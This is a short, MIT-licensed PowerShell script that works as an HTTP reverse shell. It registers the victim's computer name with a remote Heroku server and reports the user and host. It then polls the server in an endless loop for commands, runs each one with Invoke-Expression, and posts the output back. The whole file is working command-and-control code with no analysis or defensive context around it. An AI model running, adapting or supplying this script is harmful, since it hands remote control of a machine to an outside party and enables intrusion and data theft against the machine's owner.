# Copyright (c) 2017 Andrea Fioraldi
# License http://opensource.org/licenses/mit-license.php MIT License

$__url = "https://reverse80.herokuapp.com/"
$__shell_name = $env:computername + "  " + (Get-Date -Format G)

try
{
    $__params = @{name = $__shell_name}
    $__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "init") -Body $__params
}
catch
{
    exit
}

$__params = @{name = $__shell_name; output = "Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`nPS " + (pwd).Path + "> "}
$__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "result") -Method POST -Body $__params

while (1 -eq 1)
{
    $__cmd = ""
    
    try
    {
        $__params = @{name = $__shell_name}
        $__cmd = (Invoke-WebRequest -UseBasicParsing -Uri ($__url + "cmd") -Body $__params).Content
    }
    catch
    {
        Sleep 1
        continue
    }
    
    if ($__cmd -eq "")
    {
        Sleep 2
        continue
    }
    elseif ($__cmd -eq "__exit__")
    {
        exit
    }
    
    $__result = ""
    $__err = ""
    
    try
    {
        $__result = (iex $__cmd 2>&1 | Out-String)
    }
    catch
    {
        Write-Error $_
        $__err = $_
    }

    $__output = $__result + $__err
    
    $__params = @{name = $__shell_name; output = $__output + "`nPS " + (pwd).Path + "> "}
    $__dumb = Invoke-WebRequest -UseBasicParsing -Uri ($__url + "result") -Method POST -Body $__params
}
